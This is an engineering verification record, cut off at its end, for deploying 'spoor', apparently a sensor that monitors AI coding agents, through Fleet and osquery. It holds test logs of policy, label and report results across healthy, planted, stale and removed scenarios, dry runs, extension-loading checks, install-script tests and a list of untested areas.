# deploy/fleet: verification record

Captured 2026-11-12, and re-run after the adversarial review's fixes (tier-3
examples, binary-only install policies, path and opt-in report changes,
verify.sh polling), against the live test stack of this repository's build
sandbox: **Fleet 4.94.1** (license tier Free), **fleetctl 4.94.1**, and one
enrolled host `vm` running **plain osquery 5.19.0** on Ubuntu (not fleetd).
Paths under the build scratchpad are shortened to `$S` below; nothing else in
the captured output is edited.

## Safety on a shared server

- `fleetctl gitops` was only ever run with `--dry-run`.
- The server's agent options were saved (`fleetctl get config --yaml` and
  `--json`) before spoor's ATC tables were applied, and restored afterwards.
  The run's last lines confirm the restored agent options are **identical**
  to the saved copy, and that **no** label, report or policy named
  `spoor-c5-*` was left. The extension probe below restored them again and
  re-checked (identical).
- Labels, policies and reports were applied one by one with
  `fleetctl apply -f` under the prefix `spoor-c5-` and deleted by name
  (`fleetctl delete -f` for labels and reports, the policy delete API for
  policies).
- For the extension tier the throwaway extension was appended to the host's
  `extensions.load`, osqueryd was restarted as ENV.md describes, and at the
  end the line was removed (the file is empty again) and osqueryd restarted.
  Afterwards (checked again after the re-run): host `vm` online,
  `osquery_extensions` lists only `core`, no `spoor_*` table registered.

## 1. Live run of verify.sh (ATC tier and extension tier)

Command (the extension was built outside the repository from a scratch
`main` that calls `osqext.Run` against the harness database):

```
FLEETCTL=$S/fleetfix/bin/fleetctl FLEET_HOST=vm WORK=$S/fleetfix/verify PREFIX=spoor-c5- \
EXT_LOAD=$S/fleetstack/osq/extensions.load EXT_BIN=$S/fleetfix/ext/spoor-fix.ext \
OSQUERY_RESTART=$S/fleetfix/bin/restart-osqueryd ./deploy/fleet/verify.sh
```

The state databases were written by the harness in `test/e2e/fleet_test.go`
through `state.Store.Apply`, `SetAgentProcesses`, `SetCoverage` and
`MarkScan`; the planted project files and MCP server went through
`discovery.ScanProject`. `SPOOR_BIN` was not used: `cmd/spoor` was not built
for this run. Each policy is checked twice: as a live query (a row means
pass) and as Fleet's own policy result after a host refetch.

A first attempt of this re-run stopped at the GitOps dry run, which is what
it is for: `label "spoor tables unavailable" description may not exceed 255
characters` (the description had been extended). It was shortened, and a
unit test now holds every label description to Fleet's 255 characters.

Result: **0 failed checks**; `default.yml` (now with the tier-3 agent
options `lib/agent-options.base.example.yml`) passes the dry run; every
spoor policy passes on the healthy database and fails with the planted
findings, with a 25-hour-old heartbeat and with the database removed; a
2-hour-old heartbeat fails only the sensor policy (the 30 min / 24 h
trade-off). The opt-in Linux report, now with the `processes` lookup for
depth 2, ran (0 rows: audit events are not enabled on this host; section 6
shows the lookup attributing a grandchild on this osquery); the macOS and
Windows opt-in reports fail here with "no such table" as expected on Linux.

```
[05:41:31] Fleet 4.94.1, host vm (id 1), work dir $S/fleetfix/verify
[05:41:36] osquery 5.19.0
[05:41:36] saved agent options (920 bytes) to $S/fleetfix/verify/agent-options.before.json
[05:41:36] fleetctl gitops --dry-run deploy/fleet/gitops/default.yml
  [+] would've created 4 labels
  [+] would've applied certificate authorities
  [+] would've applied 4 scripts
  [+] would've applied fleet config
  [+] would've applied MDM profiles
  [+] would've applied enroll secrets
  [+] would've applied 10 policies
  [+] would've applied 4 reports
  [!] gitops dry run succeeded
[05:41:37] harness wrote specs, merged agent options and expectations for DB $S/fleetfix/verify/data/state.db
  [+] applied fleet config
  [+] applied 4 reports
  [+] applied 4 labels
  [+] applied 10 policies
[05:41:37] == tier 2: ATC
[05:41:51] all 9 spoor tables registered through ATC
[05:41:51] == scenario healthy (ATC)
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            1 rows; columns: asset_id,auth_mode,command,ecosystem,env_keys,first_seen,host_display_name,host_hostname,l
        spoor_extensions             1 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                0 rows; columns: 
        spoor_detections             1 rows; columns: agent_id,category,confidence,count,dedup_key,enforced,event_id,host_display_name,host_host
        spoor_sessions               1 rows; columns: agent_id,coverage,detections,host_display_name,host_hostname,last_event,max_severity,path,
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,path,
        spoor_coverage               2 rows; columns: agent_id,hooks,host_display_name,host_hostname,path,processes,state,transcript,updated,use
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:43:36] == scenario planted (ATC)
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:44:33] == scenario stale (ATC)
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:45:29] == scenario stale25h (ATC)
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:46:28] == scenario removed (ATC)
  state database removed: ls: cannot access '$S/fleetfix/verify/data/state.db': No such file or directory
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             not member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:47:27] == reports (stock profile and opt-in exec reports) as live queries on the healthy database
        spoor - detections                                             [darwin,linux,windows] 1 rows
        spoor - AI inventory (packed)                                  [darwin,linux,windows] 1 rows
        spoor - telemetry coverage                                     [darwin,linux,windows] 2 rows
        spoor - sensor health                                          [darwin,linux,windows] 1 rows
        spoor opt-in - agent child processes (Linux, audit)            [linux] 0 rows
        spoor opt-in - agent child processes (macOS, EndpointSecurity) [darwin] error: no such table: es_process_events
        spoor opt-in - agent child processes (Windows, ETW)            [windows] error: no such table: process_etw_events
[05:48:04] == tier 3: osquery extension $S/fleetfix/ext/spoor-fix.ext
  [+] applied fleet config
[05:48:17] ATC tables gone; registering the extension in $S/fleetstack/osq/extensions.load
  [{"host_display_name":"vm","host_hostname":"vm","name":"spoor","path":"/run/osqt/osquery.em.44150","type":"extension","version":"c5-verify"}]
[05:48:33] == scenario healthy (extension)
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            1 rows; columns: asset_id,auth_mode,command,ecosystem,env_keys,first_seen,host_display_name,host_hostname,l
        spoor_extensions             1 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                0 rows; columns: 
        spoor_detections             1 rows; columns: agent_id,category,confidence,count,dedup_key,enforced,event_id,host_display_name,host_host
        spoor_sessions               1 rows; columns: agent_id,coverage,detections,host_display_name,host_hostname,last_event,max_severity,permi
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,pid,r
        spoor_coverage               2 rows; columns: agent_id,hooks,host_display_name,host_hostname,processes,state,transcript,updated,user
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:50:15] == scenario planted (extension)
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:51:15] == scenario removed (extension)
  state database removed: ls: cannot access '$S/fleetfix/verify/data/state.db': No such file or directory
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             not member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[05:52:10] cleanup
[05:52:16] extension unregistered from $S/fleetstack/osq/extensions.load, osqueryd restarted
[05:52:16] agent options restored: identical to the saved copy
[05:52:16] objects named spoor-c5-* left on the server: labels 0, reports 0, policies []
[05:52:16] done: 0 failed checks
```

## 2. GitOps dry runs

`deploy/fleet/gitops/default.yml` (stock profile, scripts, tier-3 example
agent options) is in the run above: dry run succeeded. The other generated
files, through a scratch `default.yml` that names them (the fleetd profile
with the ATC example agent options, the builtin profile with the base
example), after the run above had removed its objects:

```
$ fleetctl gitops --dry-run -f default.yml   # labels/policies/reports from lib/fleetd + lib/opt-in, agent options lib/agent-options.example.yml
[+] would've created 4 labels
[+] would've applied certificate authorities
[+] would've applied 0 scripts
[+] would've applied fleet config
[+] would've applied MDM profiles
[+] would've applied enroll secrets
[+] would've applied 10 policies
[+] would've applied 7 reports
[!] gitops dry run succeeded
exit 0
$ fleetctl gitops --dry-run -f default.yml   # labels/policies/reports from lib/builtin + lib/opt-in, agent options lib/agent-options.base.example.yml
[+] would've created 1 label
[+] would've applied certificate authorities
[+] would've applied 0 scripts
[+] would've applied fleet config
[+] would've applied MDM profiles
[+] would've applied enroll secrets
[+] would've applied 2 policies
[+] would've applied 4 reports
[!] gitops dry run succeeded
exit 0
$ fleetctl gitops --dry-run -f deploy/fleet/gitops/default.yml -f deploy/fleet/gitops/fleets/workstations.yml   # Premium example
Error: 3 errors occurred:
	* failed to parse policy install_software "spoor installed (Linux deb)": install_software.package_path URL https://downloads.example.com/spoor/0.1.0/spoor_0.1.0_linux_amd64.deb not found on team: ../../software/spoor-deb.package.yml
	* failed to parse policy install_software "spoor installed (Linux rpm)": install_software.package_path URL https://downloads.example.com/spoor/0.1.0/spoor_0.1.0_linux_amd64.rpm not found on team: ../../software/spoor-rpm.package.yml
	* failed to parse policy install_software "spoor installed (macOS)": install_software.package_path URL https://downloads.example.com/spoor/0.1.0/spoor_0.1.0_darwin_universal.pkg not found on team: ../../software/spoor-pkg.package.yml


exit 1
```

The Premium example still fails on this Free server, and only where Fleet
Premium is required: fleetctl 4.94.1 parses the `software` section only with
a Premium license (`pkg/spec/gitops.go`, `if appConfig != nil &&
appConfig.License.IsPremium()`), so the install-on-failure policies cannot
find their packages. Without the `install_software` and `software` keys,
fleetctl skips a fleet file entirely on Free, so the fleet's own labels
(Debian-family and Red Hat-family Linux) and its policies were checked only
by the unit tests:

```
$ fleetctl gitops --dry-run -f default.yml -f fleets/workstations.yml   # Premium example without install_software and software
[!] skipping team config fleets/workstations.yml since teams are only supported for premium Fleet users
[+] would've created 4 labels
[+] would've applied certificate authorities
[+] would've applied 4 scripts
[+] would've applied fleet config
[+] would've applied MDM profiles
[+] would've applied enroll secrets
[+] would've applied 10 policies
[+] would've applied 4 reports
[!] gitops dry run succeeded
exit 0
```

## 3. ATC and the extension together

ATC agent options applied first, then the extension registered in
`extensions.load`: osquery keeps the ATC tables and refuses the extension,
which restarts every few seconds. The README and the ATC fragment say so.

```
== case A: ATC applied first, then the extension is loaded
[+] applied fleet config
ATC tables registered: 9
osquery_extensions: []
registry spoor_health: [{"active":"1","host_display_name":"vm","host_hostname":"vm","internal":"1","name":"spoor_health","owner_uuid":"0"}]
spoor_health columns: ["bundle_version","catalog_version","detections","dropped","errors","events_in","events_out","heartbeat","host_display_name","host_hostname","host_id","host_id_source","last_scan","mode","path","profile","rules_count","rules_hash","rules_version","scan_complete","sensor_version","started"]
osqueryd.log (extension lines):
W1112 04:31:12.510463  2019 watcher.cpp:739] Extension respawning too quickly: $S/fleet-c5/ext/spoor-c5.ext
I1112 04:31:12.721879  2810 interface.cpp:137] Registering extension (spoor, 14586, version=c5-verify, sdk=)
E1112 04:31:12.721957  2810 interface.cpp:143] Could not add extension spoor: Registry item spoor_agent_processes conflicts with another item of the same name.
spoor-c5 extension: osqext: status 1 registering extension: Failed adding registry: Registry item spoor_agent_processes conflicts with another item of the same name.
W1112 04:31:15.511519  2019 watcher.cpp:739] Extension respawning too quickly: $S/fleet-c5/ext/spoor-c5.ext
I1112 04:31:15.723018  2941 interface.cpp:137] Registering extension (spoor, 7908, version=c5-verify, sdk=)
E1112 04:31:15.723088  2941 interface.cpp:143] Could not add extension spoor: Registry item spoor_agent_processes conflicts with another item of the same name.
spoor-c5 extension: osqext: status 1 registering extension: Failed adding registry: Registry item spoor_agent_processes conflicts with another item of the same name.
agent options restored: identical
extensions.load now: []
```

## 4. Install scripts (container)

`TestFleetInstallScripts` runs the shell scripts in a throwaway Debian 12
container (`mirror.gcr.io/library/redis:7`) with fake `systemctl` and
`spoor` binaries under a `SPOOR_ROOT` prefix: wrong SHA-256 installs
nothing; with orbit's `/opt/orbit/extensions.load` in use (non-empty) the
extension tier and `register-extension.sh` refuse with the reason and change
nothing; with orbit's file empty, install writes binary, extension, unit,
the `Group=spoor` drop-in, data dir 0750 and the default `extensions.load`,
keeping an existing last line that has no newline (it was glued to spoor's
path before the fix), and schedules a detached osquery restart; a second run
changes nothing and only starts the service; with orbit present orbit is
what restarts, and the atc tier works while orbit's file is in use and
unregisters spoor; `register-extension.sh` is idempotent; uninstall twice
keeps data and other autoload lines and removes the drop-in; orbit's
`extensions.load` is never written.

```
$ SPOOR_E2E_FLEET=1 go test -tags e2e ./test/e2e -run FleetInstallScripts -v
    fleet_test.go:641: install:
        spoor install: osquery (osqueryd) restarts in 10 s to load /work/root/usr/lib/spoor/spoor.ext
        spoor install: spoor-fake-1 installed at /work/root/usr/bin/spoor (tier extension)
--- PASS: TestFleetInstallScripts (1.44s)
PASS
ok  	github.com/thomastysong/spoor/test/e2e	1.448s
```

Script sizes (Fleet's limit is 10,000 characters): install-spoor.sh 9,405,
install-spoor.ps1 7,279, uninstall-spoor.sh 2,528, uninstall-spoor.ps1
1,950, register-extension.sh 2,441, register-extension.ps1 2,175.

## 5. Unit tests (no network, every OS)

`go test ./internal/fleetgen` emulates osquery with SQLite: the spoor tables
as views over a database written by `state.Store` (once with every column
TEXT plus a `path` column, as ATC does; once typed, as the extension does)
and the osquery tables the content reads as stubs. It covers every policy
against 23 scenarios in both flavours and both spoor profiles, the labels
(including a POSIX path on Windows not counting as installed), every report,
the opt-in reports' depth-1/depth-2 attribution (also when the depth-1
parent's exec event was in an earlier run, through `processes`, and not for
a reused pid), the catalog flag classification, a real project scan
producing every auto-run flag, the agent options merge, the golden files,
Fleet's 255-character label description limit, the Premium install
policies (fail with only the state database present) and family labels,
one tier per GitOps example, path validation (glob characters, unclean
paths), and the scripts: the exact `extensions.load` registration blocks
run by `sh` against existing files with and without a final newline, the
orbit refusal blocks, `verify.sh`'s polling with a fake fleetctl that first
answers nothing, and every `sc.exe`/`icacls.exe` call of the PowerShell
scripts through a model of Windows PowerShell 5.1's native argument passing
(which reproduces the old `binPath=` failure). Worst-case packed report
sizes with maximum-length values full of characters JSON must escape
(Fleet drops host results of 512 KiB or more):

```
    semantics_test.go:464: stock/spoor - AI inventory (packed): 369492 bytes
    semantics_test.go:464: fleetd/spoor - AI inventory (packed, with ai_tools): 223264 bytes
    semantics_test.go:464: builtin/AI tools (packed): 124326 bytes
```

## 6. osquery path handling and the opt-in lookup (local osquery 5.19.0)

Why custom state database paths must be clean and pattern-free: ATC resolves
its `path` as a glob (`?`, `[...]` and, with brace expansion, `{A,B}`) and
reports the canonical path, while the `file` table that the "spoor
installed" label reads reports a path exactly as written. Run with
`osqueryd -S --config_path=cfg.json` over three one-row databases
`$W/db/spoorA`, `spoorB`, `spoorC` (`$W` is a scratch directory). The last probe shows `processes.start_time`
is in Unix seconds, like the event tables' `time`, which the opt-in reports
compare.

```
$ ATC path $W/db/spoor?/state.db
[{"v":"A","path":"$W/db/spoorA/state.db"},{"v":"B","path":"$W/db/spoorB/state.db"},{"v":"C","path":"$W/db/spoorC/state.db"}]
$ ATC path $W/db/spoor[AB]/state.db
[{"v":"A","path":"$W/db/spoorA/state.db"},{"v":"B","path":"$W/db/spoorB/state.db"}]
$ ATC path $W/db/spoor{A,B}/state.db
[{"v":"A","path":"$W/db/spoorA/state.db"},{"v":"B","path":"$W/db/spoorB/state.db"}]
$ ATC path $W/db//spoorA/state.db
[{"v":"A","path":"$W/db/spoorA/state.db"}]
$ osqueryd -S "SELECT path FROM file WHERE path = '$W/db//spoorA/state.db'"
[{"path":"$W/db//spoorA/state.db"}]
$ osqueryd -S "SELECT pid, parent, start_time FROM processes WHERE pid = 1"; date +%s
[{"parent":"0","pid":"1","start_time":"1794454940"}]
1794462130
```

The opt-in Linux report's new depth-2 lookup, on the same osquery: the
generated query with its two inputs that need audit and spoor replaced by
stand-ins, and a real process as the depth-1 parent whose exec event is
not in the batch (as when it started in an earlier scheduled run):

```
$ sleep 300 &   # pid 12164, child of shell 12162: stand-ins for an agent's depth-1 shell (exec event in an earlier run) and the agent root
$ osqueryd -S "<the generated Linux opt-in query, with spoor_agent_processes replaced by (12162, claude-code, sess-1) and process_events by one exec of pid 999999 whose parent is 12164>"
{"pid":"999999","parent":"12164","depth":"2","agent_id":"claude-code","session_ref":"sess-1"}
```

## Not verified here

- **fleetd profile and builtin profile**: the enrolled host runs plain
  osquery 5.19, which has no `ai_tools` table, so these were validated only
  by `fleetctl gitops --dry-run` (above) and the unit-test emulator with an
  `ai_tools` stub built from Fleet's schema (`schema/tables/ai_tools.yml`).
- **macOS and Windows**: no such hosts. Untested: the darwin and windows ATC
  blocks on a real host, `es_process_events` / `process_etw_events` (columns
  from Fleet's osquery schema JSON), the `osquery_info.build_platform` values
  `darwin` and `windows` used by the "installed" label (only `linux` was
  observed), the PowerShell scripts (no PowerShell here: checked statically
  and through the PowerShell 5.1 argument-passing model; `New-Service`,
  `Win32_Service.Change` and the `sc.exe` exit codes were not run), and the
  macOS branch of the shell scripts (`dseditgroup`, `launchctl`).
- **fleetd/orbit**: the detached orbit restart, and orbit's handling of its
  own `extensions.load` (an `--extensions_autoload` flag only while the file
  is non-empty, `orbit/cmd/orbit/orbit.go` 1586-1603), were read from code,
  not run; the scripts' refusal on a non-empty orbit file ran in the
  container (section 4).
- **systemd**: the container has a fake `systemctl`, so the `Group=spoor`
  drop-in was checked as a file, not on a running systemd; the re-owning of
  `StateDirectory=` it counters is systemd's documented behaviour, not
  observed here.
- **Fleet Premium**: package YAMLs, install-on-failure policies, per-fleet
  files and fleet labels (dry run refused or skipped on a Free server, see
  section 2), and the rollback of a package whose post-install script
  fails (from Fleet's REST API documentation).
- **A real sensor**: the state databases came from the harness, not from
  `spoor scan --state` / `spoor run` (cmd/spoor is not built yet); verify.sh
  switches to them when `SPOOR_BIN` is set. The scripts ran with a fake
  `spoor` binary, so `spoor export config` and `spoor version` were not
  exercised for real.
- Fleet's scheduled policy interval (hourly) was not waited for: results
  were forced with a host refetch.

## With the spoor binary (2026-11-12)

The sections above used the harness for every state database and a scratch
extension. This pass ran `verify.sh` with `SPOOR_BIN`: the databases of the
healthy scenario and of a new "hook" scenario were written by the built
`spoor` binary (`scan --state`, `run`, and for "hook" `hook` with the daemon
